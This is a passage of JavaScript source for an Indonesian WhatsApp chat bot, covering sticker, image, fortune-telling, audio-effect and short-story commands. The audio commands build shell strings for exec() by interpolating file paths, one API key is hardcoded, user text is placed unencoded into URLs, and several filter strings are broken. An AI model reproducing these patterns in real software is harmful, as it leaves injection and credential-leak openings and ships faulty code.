        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #sadboy aku&kamu")
        reply("[❗] SEDANG DIPROSES")
        conn.sendMessage(from, { image: { url: `https://oni-chan.my.id/api/canvas/nekosad?text1=${q1}&text2=${q2}&apikey=` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
        break
      case 'kaneki': case 'loliggo': case 'gura':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Masukkan text\nContoh: #${command} bot`)
        reply("[❗] SEDANG DIPROSES")
        conn.sendMessage(from, { image: { url: `https://oni-chan.my.id/api/canvas/${command}?name=${q}&apikey=` }, caption: "done!!", mentions: [sender] }, { quoted: msg })
        break
      case 'waifu': case 'lick': case 'kiss': case 'awoo': case 'hug': case 'cry': case 'cuddle': case 'bully': case 'megumin': case 'shinobu': case 'neko': case 'slap': case 'wink': case 'dance': case 'poke': case 'glomp': case 'bite': case 'nom': case 'handhold': case 'highfive': case 'wave': case 'smile': case 'yeet': case 'bonk': case 'smug': case 'pat':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
        reply("[❗] SEDANG DIPROSES")
        fetchJson(`https://api.waifu.pics/sfw/${command}`).then(x => {
          conn.sendMessage(from, { image: { url: x.url }, caption: "Done!!", mentions: [sender] }, { quoted: msg })
        })
        break
      case 'dadu':
      case 'gawrgura': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        let buffer = `https://api.lolhuman.xyz/api/sticker/${command}?apikey=AryaXyz`
        conn.sendMessage(from, { sticker: { url: buffer }, mimetype: 'image/webp' }, { quoted: msg })
      }
        break
        case 'bucinsticker':
      case 'bucinstiker':
      case 'bucinstick':
      case 'bucinstik':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        try {
        var xa = require('xfarr-api');
        const bucin = await xa.search.stickersearch('bucin')
          console.log(bucin)
          if (bucin.status != 200) return reply(`Sticker tidak ditemukan`)
         let bucins = bucin.sticker_url[Math.floor(Math.random() * bucin.sticker_url.length)]
        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
          conn.sendImageAsSticker(from, bucins, msg, opt)
          } catch(e) {
          console.log(e)
    reply(`Waduh error masbroo..`)
        }
        break
      case 'stickerpatrick':
      case 'stikerpatrick':
      case 'stickerpatrik':
      case 'stikerpatrik':
      case 'spatrick':
      case 'spatrik':
      case 'patrick':
      case 'patrik':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        try  {
        var xa = require('xfarr-api');
        const patrick = await xa.search.stickersearch('patrick')
          console.log(patrick)
        if (patrick.status != 200) return reply(`Sticker tidak ditemukan`)
       let patricks = patrick.sticker_url[Math.floor(Math.random() * patrick.sticker_url.length)]
        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
        conn.sendImageAsSticker(from, patricks, msg, opt)
      } catch(e) {
          console.log(e)
    reply(`Waduh error masbroo..`)
        }
        break
      case 'spongebobsticker':
      case 'spongebobstiker':
      case 'spongebob':
      case 'spongbob':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        try {
        var xa = require('xfarr-api');
        const spong = await xa.search.stickersearch('spongebob squarepants')
        console.log(spong)
          if (spong.status != 200) return reply(`Sticker tidak ditemukan`)
        let spongs = spong.sticker_url[Math.floor(Math.random() * spong.sticker_url.length)]
        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
        conn.sendImageAsSticker(from, spongs, msg, opt)
      } catch(e) {
          console.log(e)
    reply(`Waduh error masbroo..`)
        }
        break
case 'stickeranjing':
      case 'stikeranjing':
      case 'anjing':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        try {
        var xa = require('xfarr-api');
        const anjnn = await xa.search.stickersearch('anjing')
        console.log(anjnn)
          if (anjnn.status != 200) return reply(`Sticker tidak ditemukan`)
        let anj = anjnn.sticker_url[Math.floor(Math.random() * anjnn.sticker_url.length)]
        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
        conn.sendImageAsSticker(from, anj, msg, opt)
      } catch(e) {
          console.log(e)
    reply(`Waduh error masbroo..`)
        }
        break
      case 'stickersearch':
      case 'stikersearch':
      case 'stsearch':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example:\n${prefix + command} patrick`)
        reply(mess.wait)
        try {
        var xa = require('xfarr-api');
        const ssti = await xa.search.stickersearch(q)
        console.log(ssti)
          if (ssti.status != 200) return reply(`Sticker tidak ditemukan`)
        let stis = ssti.sticker_url[Math.floor(Math.random() * ssti.sticker_url.length)]
        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
        conn.sendImageAsSticker(from, stis, msg, opt)
      } catch(e) {
          console.log(e)
    reply(`Waduh error masbroo..`)
        }
        break
      case 'amongus':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        reply(mess.wait)
        try {
        var xa = require('xfarr-api');
        const among = await xa.search.stickersearch('amongus')
        console.log(among)
          if (among.status != 200) return reply(`Sticker tidak ditemukan`)
        let amngus = among.sticker_url[Math.floor(Math.random() * among.sticker_url.length)]
        var opt = { packname: 'GuraBot - MD', author: 'By Ekuzika OfC' }
        conn.sendImageAsSticker(from, amngus, msg, opt)
      } catch(e) {
          console.log(e)
    reply(`Waduh error masbroo..`)
        }
        break
      // PRIMBON
      case 'ramalanjodoh': case 'ramaljodoh': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
        let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
        let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
      }
        break
      case 'nomorhoki': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} 6288292024190`)
        let anu = await primbon.nomer_hoki(q)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nomor HP :* ${anu.message.nomer_hp}\n> *Angka Shuzi :* ${anu.message.angka_shuzi}\n> *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n> *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
      }
        break
      case 'artimimpi': case 'tafsirmimpi': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} belanja`)
        let anu = await primbon.tafsir_mimpi(q)
        if (anu.status == false) return m.reply(anu.message)
        reply(`> *Mimpi :* ${anu.message.mimpi}\n> *Arti :* ${anu.message.arti}\n> *Solusi :* ${anu.message.solusi}`)
      }
        break
      case 'ramalanjodohbali': case 'ramaljodohbali': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
        let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
        let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
      }
        break
      case 'suamiistri': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
        let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
        let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
        if (anu.status == false) return m.reply(anu.message)
        reply(`> *Nama Suami :* ${anu.message.suami.nama}\n> *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n> *Nama Istri :* ${anu.message.istri.nama}\n> *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
      }
        break
      case 'ramalancinta': case 'ramalcinta': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
        let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
        let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}\n> *Catatan :* ${anu.message.catatan}`)
      }
        break
      case 'artinama': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} Yanto`)
        let anu = await primbon.arti_nama(text)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nama :* ${q}\n> *Arti :* ${anu.message.arti}\n> *Catatan :* ${anu.message.catatan}`)
      }
        break
      case 'kecocokannama': case 'cocoknama': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} yanto, 7, 7, 2005`)
        let [nama, tgl, bln, thn] = q.split`,`
        let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nama :* ${anu.message.nama}\n> *Lahir :* ${anu.message.tgl_lahir}\n> *Life Path :* ${anu.message.life_path}\n> *Destiny :* ${anu.message.destiny}\n> *Destiny Desire :* ${anu.message.destiny_desire}\n> *Personality :* ${anu.message.personality}\n> *Persentase :* ${anu.message.persentase_kecocokan}`)
      }
        break
      case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example :\n${prefix + command} yanto|yanti`)
        let [nama1, nama2] = q.split`|`
        let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Nama Anda :* ${anu.message.nama_anda}\n> *Nama Pasangan :* ${anu.message.nama_pasangan}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}`)
      }
        break
      case 'sifatusaha': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!q) return reply(`Example : ${prefix + command} 24, 10, 2005`)
        let [tgl, bln, thn] = q.split`,`
        let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
        if (anu.status == false) return reply(anu.message)
        reply(`> *Lahir :* ${anu.message.hari_lahir}\n> *Usaha :* ${anu.message.usaha}`)
      }
        break
      case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (!quoted && !q) reply(`Kirim/reply text dengan caption *${prefix + command}*`)
        var ter = command[0].toLowerCase()
        var tex = quoted ? quoted.text ? quoted.text : q ? q : text : q ? q : text
        reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
        break

      // AUDIO CHANGER
      case 'bass': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af equalizer=f=54:width_type=o:width=2:g=20'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'blown': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af acrusher=.1:1:64:0:log'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'deep': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af atempo=4/4,asetrate=44500*2/3'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'earrape': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-af volume=12'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'fast': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=1.63,asetrate=44100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'fat': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=1.6,asetrate=22100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'nightcore': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter_complex "areverse'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'reverse': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter_complex "areverse"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'robot': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'slow': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=0.7,asetrate=44100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'smooth': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'tupai': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        if (isQuotedAudio) {
          var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
          let ran = 'sticker/' + getRandom('.mp3')
          var kode_js = '-filter:a "atempo=0.5,asetrate=65100"'
          exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
            if (err) return reply(err)
            reply(mess.wait)
            let buff = fs.readFileSync(ran)
            conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: msg })
            fs.unlinkSync(`./${ran}`)
            fs.unlinkSync(`./${buffer}`)
          })
        } else {
          reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
        }
      }
        break

      case 'wallpaperislami': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let kcle = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Islamic.json`)
        let random = kcle[Math.floor(Math.random() * kcle.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpaperinori': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let kuxe = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/inori-pic.json`)
        let random = kuxe[Math.floor(Math.random() * kuxe.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpapercyber': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let xpwl = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/CyberSpace.json`)
        let random = xpwl[Math.floor(Math.random() * xpwl.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break

      // Random image
      case 'loli':
      case 'husbu':
      case 'milf':
      case 'cosplay':
      case 'wallml': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let eek = await fetchJson(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)
        let random = eek[Math.floor(Math.random() * eek.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpaperteknologi': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let toth = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Technology.json`)
        let random = toth[Math.floor(Math.random() * toth.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpaperanime': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let tozs = await fetchJson(`https://raw.githubusercontent.com/qisyana/senku/main/storages/anime-wallpaper-pic.json`)
        let random = tozs[Math.floor(Math.random() * tozs.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpapergamer': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let toew = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/GameWallp.json`)
        let random = toew[Math.floor(Math.random() * toew.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpaperprogamer': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let xeke = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Programming.json`)
        let random = xeke[Math.floor(Math.random() * xeke.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpapermeme': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let crkr = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/meme.json`)
        let random = crkr[Math.floor(Math.random() * crkr.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'wallpaper': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let crpe = await fetchJson(`https://raw.githubusercontent.com/Aprilia3/RestApi/master/data/Mountain.json`)
        let random = crpe[Math.floor(Math.random() * crpe.length)]
        conn.sendMessage(from, { image: { url: random }, caption: `Nih Kak` }, { quoted: msg })
      }
        break
      case 'ppcouple': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
        let random = anu[Math.floor(Math.random() * anu.length)]
        conn.sendMessage(from, { image: { url: random.male }, caption: `Foto Couple Male` }, { quoted: msg })
        conn.sendMessage(from, { image: { url: random.female }, caption: `Fofo Couple Female` }, { quoted: msg })
      }
        break

      case 'cerpen-anak': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`anak`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasadaerah': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`bahasa daerah`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasainggris': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`bahasa Inggris`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasajawa': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`bahasa jawa`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-bahasasunda': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`bahasa sunda`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-budaya': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`budaya`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cinta': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`cinta`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintaislami': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`cinta islami`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintapertama': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`cinta pertama`)
        reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
      }
        break
      case 'cerpen-cintaromantis': {
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
        let cerpe = await cerpen(`cinta romantis`)
